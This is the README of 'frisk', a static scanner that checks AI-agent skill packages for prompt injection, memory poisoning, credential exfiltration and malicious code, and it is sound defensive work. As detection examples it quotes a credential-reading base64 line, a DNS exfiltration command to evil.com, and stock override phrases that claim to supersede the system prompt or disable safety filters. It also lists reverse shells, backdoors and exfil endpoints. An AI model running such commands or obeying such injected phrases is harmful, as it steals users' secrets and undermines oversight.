# frisk

[![CI](https://github.com/luoojason/frisk/actions/workflows/ci.yml/badge.svg)](https://github.com/luoojason/frisk/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

**You wouldn't run a stranger's `.exe`. You just installed twelve of their `SKILL.md` files.**

frisk scans an AI-agent skill for prompt injection, data exfiltration, and memory poisoning before it touches your machine. One command, no install, no API key.

```
npx frisk ./some-skill
```

```
frisk  scanning ./pdf-helper

  ●  RED - do not install

  HIGH  exfiltration  ASI06  scripts/setup.sh:14
    Reads credentials/secrets and sends data over the network in the same script (data exfiltration).
    > PAYLOAD=$(cat ~/.aws/credentials | base64)
    fix: A skill should never read cloud credentials, SSH keys, or .env files and transmit them. Remove this.

  MED   injection     ASI01  SKILL.md:31  (hidden text)
    Hidden html-comment text contains agent instructions the human reviewer cannot see.

  2 findings (1 high, 1 medium) · 1 file flagged · 4ms
```

## Why

The 2026 agent-skill gold rush has everyone installing `SKILL.md` files (and the scripts bundled next to them) from strangers, with zero vetting. One real incident already involved a third-party skill quietly exfiltrating data. A skill is code plus instructions your agent will trust. frisk reads it first.

## What it checks

Five categories, each mapped to the OWASP Agentic Top 10:

| Category | What it catches | OWASP |
|---|---|---|
| Prompt injection | Override phrasing, hidden instructions (HTML comments, zero-width/bidi characters, invisible styling), **priority-override claims** ("this instruction supersedes the system prompt"), **safety-filter disables** ("disable all safety filter mechanisms") | ASI01 |
| Memory poisoning | Writes to `CLAUDE.md` / `~/.claude` and self-propagating "add this to your own skill" directives | ASI02 |
| Malicious code | Reverse shells (bash / python / perl / ruby / socat), remote code execution (`curl \| bash` or any interpreter, download-and-run, process substitution, `exec` of fetched or base64-decoded code), persistence and privilege-escalation backdoors (`/etc/sudoers`, `authorized_keys`, **setuid/setgid on system binaries**, **`sudo su` root shell**), obfuscated payloads, destructive operations | ASI05 |
| Data exfiltration | Credential read + network egress in the same script (`~/.aws`, `~/.ssh`, `.env`, tokens - over HTTP, DNS, or email), **base64-encode-then-send** obfuscation, contacts with known-bad exfil endpoints (webhook.site, requestbin, ngrok, beeceptor, canarytokens, etc.) | ASI06 |
| Capability mismatch | Behavior the skill never declared in its frontmatter | ASI08 |

### Detection rules added in v0.1.1

| Rule ID | Category | Signal | Severity |
|---------|----------|--------|----------|
| INJ-006 | injection | Skill claims to override/supersede the system prompt or operator instructions | high |
| INJ-safety | injection | Skill instructs the agent to disable safety filters or guardrails | high |
| MAL-007 | malicious-code | `chmod` sets setuid/setgid bit on a system-path binary | high |
| MAL-009 | malicious-code | `sudo su` / `su - root` interactive root shell | high |
| EXF-005 | exfiltration | `base64 \| curl/wget` encode-then-transmit obfuscation | medium |

Bug fixes in v0.1.1:
- **exfiltration rule** now strips comments before scanning, so a commented-out credential reference no longer fires as high severity (false positive)
- **capability rule** now strips comments before scanning, so `# curl ...` in a comment no longer triggers an undeclared-capability finding
- **DNS exfil** pattern now catches `dig +time=5 $data.evil.com` (interleaved flags) that evaded the old single-variant regex
- **httpx** added to egress patterns (Python async HTTP client was missing)
- **SUSPICIOUS_HOSTS** expanded with `beeceptor.com` and `canarytokens.{com,org}`

## Usage

```bash
npx frisk ./my-skill              # scan a local skill
npx frisk gh:owner/repo           # fetch and scan a skill on GitHub (never executed)
npx frisk ./skills                # scan a folder of skills
npx frisk ./my-skill --json       # machine-readable output
npx frisk ./my-skill --sarif      # SARIF 2.1.0 for CI / code scanning
npx frisk ./my-skill --llm        # add the optional LLM judge (needs ANTHROPIC_API_KEY)
```

Useful flags: `--fail-on <high|medium|low>` (default `high`), `--min-confidence <level>`, `--allow <ruleId>`, `--badge <file>`, `--quiet`.

The default scan is fully static and needs no API key. The optional `--llm` pass (auto-on when `ANTHROPIC_API_KEY` is set) adds a model review for subtle or paraphrased attacks the static rules cannot pattern-match.

## In CI

```yaml
# .github/workflows/frisk.yml
name: frisk
on: [pull_request]
jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
    steps:
      - uses: actions/checkout@v4
      - name: Run frisk
        run: npx frisk ./skills --sarif frisk.sarif --badge badge.json --fail-on high
        # exit 2 = blocked (high findings present); exit 0 = clean
      - name: Upload SARIF
        if: always()  # upload even when frisk exits 2, so PR annotations appear
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: frisk.sarif
```

The `--sarif` output includes `security-severity` scores (8.0 for high, 5.5 for medium) so GitHub's branch-protection rules can gate on security severity. Upload via `github/codeql-action/upload-sarif` to get inline PR annotations and findings in the Security tab.

**Exit codes:**
- `0` - clean, no findings at or above `--fail-on` threshold (default: `high`)
- `2` - blocked, one or more findings at or above threshold
- `1` (non-zero for any other reason) - tool or scan error

Use `--fail-on medium` for a stricter gate.

## The "frisk verified" badge

Point [shields.io](https://shields.io) at the `badge.json` the action produces:

```markdown
[![frisk](https://img.shields.io/endpoint?url=<RAW_URL_TO_badge.json>)](https://github.com/luoojason/frisk)
```

The badge reflects a real scan of your skills, not a static claim.

## Suppressing findings

A `.friskignore` next to the skill (one entry per line):

```
# a rule id suppresses that rule
capability
# fp:<fingerprint> suppresses one specific finding
fp:9f2a1c4d7e0b
# file:<glob> suppresses by path
file:scripts/legacy-*.sh
```

Or inline: `# frisk:ignore exfiltration -- reviewed, talks to our own API`.

## Honest limitations

frisk is a static scanner with an optional model pass. It raises the cost of shipping a malicious skill; it does not guarantee a skill is safe.

- Pattern-based detection can be evaded by splitting an attack across files or heavy obfuscation. The `--llm` pass narrows this but does not close it.
- It reads code, it never runs it, so it cannot observe runtime behavior.
- v1 targets Claude Code skills (`SKILL.md` plus bundled scripts). Plugins, MCP servers, and other agent ecosystems are not yet covered.
- A green result means "no known-bad patterns found", not "audited and safe".

See [`corpus/`](corpus/) for the documented attack patterns frisk detects and the benign fixtures that keep it precise.

## License

MIT
